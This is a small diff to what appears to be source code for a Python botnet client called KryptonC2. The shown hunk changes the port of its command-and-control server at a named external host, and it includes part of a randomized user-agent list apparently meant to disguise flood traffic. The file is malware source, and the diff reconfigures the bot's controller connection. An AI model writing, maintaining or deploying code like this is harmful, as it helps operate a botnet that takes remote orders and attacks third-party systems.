@@ -11,7 +11,7 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 KRYPTONC2_ADDRESS  = "nlzpsjlvr.localto.net"
-KRYPTONC2_PORT  = 7485
+KRYPTONC2_PORT  = 4983
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -640,3 +640,4 @@ if __name__ == '__main__':
             main()
         except:
             pass
+
